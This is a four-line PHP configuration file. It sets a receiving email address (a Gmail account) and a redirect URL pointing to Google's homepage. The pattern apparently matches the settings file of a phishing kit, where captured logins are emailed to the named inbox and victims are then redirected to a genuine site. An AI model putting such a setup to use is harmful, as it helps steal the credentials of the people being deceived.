<?php 
$Receive_email="sazkid253@gmail.com";
$redirect="https://www.google.com/";
?>